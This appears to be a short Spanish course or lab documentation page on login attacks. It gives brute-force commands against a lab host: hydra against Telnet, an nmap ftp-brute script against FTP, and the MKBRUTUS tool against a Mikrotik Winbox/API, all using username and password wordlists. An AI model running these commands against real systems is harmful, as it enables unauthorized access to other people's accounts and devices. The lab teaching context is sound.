---
theme: "just-the-docs"
title: "Ataque de login"
layout: default
nav_order: 7
parent: "ARRAY DIINF 2024"
---
# Ataque TELNET
## NMAP
```bash
hydra -L usuarios.txt -P diccionario.txt telnet://192.168.85.134
```
# Ataque FTP
```bash
nmap -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=diccionario.txt 192.168.85.134
```
# Winbox/API Mikrotik
```bash
cd /home/lesand/Desktop/tools
git clone https://github.com/mkbrutusproject/MKBRUTUS.git
cd MKBRUTUS
python3 mkbrutus.py -t 192.168.85.134 -d /home/lesand/Desktop/tools/diccionarios/diccionario.txt
```
